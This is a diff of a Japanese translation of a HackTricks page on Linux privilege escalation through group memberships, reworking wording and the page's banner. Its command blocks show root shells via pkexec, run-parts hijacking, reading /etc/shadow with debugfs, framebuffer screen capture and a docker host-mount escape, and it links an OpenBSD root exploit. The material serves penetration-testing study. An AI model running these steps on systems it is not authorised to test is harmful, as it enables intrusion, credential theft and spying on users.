@@ -1,24 +1,25 @@
-# インタレスティング・グループ - Linux Privesc
+# インタレスティンググループ - Linux Privesc
+
+{% hint style="success" %}
+AWSハッキングの学習と練習：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングの学習と練習：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary>HackTricksのサポート</summary>
 
-HackTricks をサポートする他の方法:
-
-* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
-* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションを発見する
-* **💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) をフォローする。
-* **ハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
+* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。
 
 </details>
+{% endhint %}
 
 ## Sudo/Admin グループ
 
-### **PE - メソッド 1**
+### **PE - 方法1**
 
-**時々**、**デフォルトで（またはあるソフトウェアが必要とするために）**、**/etc/sudoers** ファイルの中にこれらの行のいくつかを見つけることができます:
+**時々**、**デフォルトで（またはあるソフトウェアが必要とするために）**、**/etc/sudoers**ファイルの中にこれらの行のいくつかを見つけることができます：
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -43,9 +44,9 @@ find / -perm -4000 2>/dev/null
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-以下では、どのグループが**pkexec**を実行することが許可されているか、そしていくつかのLinuxディストリビューションでは**sudo**と**admin**グループが**デフォルトで**表示されます。
+以下では、どのグループが**pkexec**を実行することが許可されているか、そしていくつかのLinuxディストロでは**sudo**と**admin**グループが**デフォルトで**表示されます。
 
-**rootになるためには、次のコマンドを実行できます**:
+**rootになるには、次のコマンドを実行します**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
@@ -92,7 +93,7 @@ sudo su
 ```
 ## Staff Group
 
-**staff**: ユーザーがルート権限を必要とせずにシステム（`/usr/local`）にローカルな変更を追加できるようにします（`/usr/local/bin`内の実行可能ファイルは任意のユーザーのPATH変数にあり、同じ名前の`/bin`および`/usr/bin`内の実行可能ファイルを「上書き」する可能性があります）。監視/セキュリティに関連するグループである "adm" グループと比較してください。 [\[source\]](https://wiki.debian.org/SystemGroups)
+**staff**: システム（`/usr/local`）へのローカルな変更をルート権限なしで追加できるようにします（`/usr/local/bin`内の実行可能ファイルは任意のユーザーのPATH変数に含まれており、同じ名前の`/bin`および`/usr/bin`内の実行可能ファイルを「上書き」する可能性があります）。監視/セキュリティに関連するグループ「adm」と比較してください。[ソース](https://wiki.debian.org/SystemGroups)
 
 Debianディストリビューションでは、`$PATH`変数は、特権ユーザーであろうとなかろうと、`/usr/local/`が最優先で実行されることを示しています。
 ```bash
@@ -106,7 +107,7 @@ $ echo $PATH
 
 もし `/usr/local` 内のいくつかのプログラムを乗っ取ることができれば、root 権限を簡単に取得できます。
 
-`run-parts` プログラムを乗っ取ることは root 権限を簡単に取得する方法です。なぜなら、ほとんどのプログラムが `run-parts` を実行するようになっているからです（crontab や ssh ログイン時など）。
+`run-parts` プログラムを乗っ取ることは root 権限を簡単に取得する方法です。なぜなら、ほとんどのプログラムが `run-parts` を実行するように設定されているからです（crontab や ssh ログイン時など）。
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -148,7 +149,7 @@ $ /bin/bash -p
 ```
 ## ディスクグループ
 
-この特権はほぼ**ルートアクセスと同等**です。マシン内のすべてのデータにアクセスできます。
+この特権はほぼ**rootアクセスと同等**です。マシン内のすべてのデータにアクセスできます。
 
 ファイル：`/dev/sd[a-z][1-9]`
 ```bash
@@ -164,11 +165,11 @@ debugfs: cat /etc/shadow
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-しかし、**root所有のファイルを書き込もうとすると**（たとえば `/etc/shadow` や `/etc/passwd`）、"**Permission denied**" エラーが発生します。
+しかし、**root所有のファイルを書き込もうとすると**（たとえば `/etc/shadow` や `/etc/passwd`）、**Permission denied** エラーが発生します。
 
 ## Video Group
 
-コマンド `w` を使用すると、**システムにログインしているユーザー**を見つけることができ、次のような出力が表示されます：
+コマンド `w` を使用すると、**システムにログインしているユーザー**を見つけることができ、次のような出力が表示されます。
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
@@ -176,16 +177,24 @@ moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 **tty1**は、ユーザー**yossiがマシンの端末に物理的にログイン**していることを意味します。
 
-**videoグループ**は、画面出力を表示する権限を持っています。基本的に、画面を観察することができます。そのためには、画面上の現在のイメージを生データで取得し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存することができ、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
+**videoグループ**は、画面出力を表示する権限を持っています。基本的に、画面を観察することができます。そのためには、画面上の現在のイメージを生データで取得し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-**ルートグループ**
+**Rawイメージ**を**開く**には、**GIMP**を使用して、\*\*`screen.raw` \*\*ファイルを選択し、ファイルタイプとして**Raw image data**を選択します：
 
-デフォルトでは、**ルートグループのメンバー**が特定の**サービス**構成ファイルや**ライブラリ**ファイル、または特権を昇格させるのに使用できる**その他の興味深いもの**を変更できる可能性があります...
+![](<../../../.gitbook/assets/image (463).png>)
 
-**ルートメンバーが変更できるファイルを確認します**:
+次に、画面で使用されている幅と高さを変更し、さまざまな画像タイプを確認します（画面をよりよく表示するものを選択します）：
+
+![](<../../../.gitbook/assets/image (317).png>)
+
+## ルートグループ
+
+デフォルトでは、**ルートグループのメンバー**は、**サービス**の構成ファイルや**ライブラリ**ファイル、または特権を昇格させるのに使用できる**その他の興味深いもの**をいくつか**変更**する権限を持っているようです...
+
+**ルートメンバーが変更できるファイルを確認**してください：
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
@@ -210,9 +219,9 @@ docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chr
 ## Adm グループ
 
 通常、**`adm`** グループの**メンバー**は _/var/log/_ 内にある**ログファイルを読む**権限を持っています。\
-したがって、このグループ内のユーザーが侵害されている場合は、**ログを確認**する必要があります。
+したがって、このグループ内のユーザーが侵害された場合は、**ログを確認**する必要があります。
 
 ## Auth グループ
 
-OpenBSD内では、**auth** グループは通常、_**/etc/skey**_ および _**/var/db/yubikey**_ のフォルダに書き込む権限を持つことがあります。\
-これらの権限は、次のエクスプロイトを使用して特権を**昇格**するために悪用される可能性があります: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+OpenBSD内では、**auth** グループは通常、使用されている場合は _**/etc/skey**_ と _**/var/db/yubikey**_ のフォルダに書き込むことができます。\
+これらの権限は、次のエクスプロイトを使用して悪用され、root権限に**昇格**する可能性があります: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
